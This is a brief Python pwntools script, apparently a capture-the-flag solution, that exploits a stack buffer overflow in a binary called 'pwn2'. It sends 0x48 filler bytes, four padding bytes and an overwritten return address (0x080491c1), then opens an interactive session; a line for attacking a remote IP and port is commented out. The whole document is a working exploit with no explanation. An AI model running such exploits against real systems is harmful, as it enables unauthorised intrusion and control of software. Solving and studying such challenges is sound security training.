from pwn import *
sh = process('./pwn2')

#sh = remote('202.204.53.75',50002)

sh.sendline('a'*0x48+'bbbb'+p32(0x080491c1))

sh.interactive()
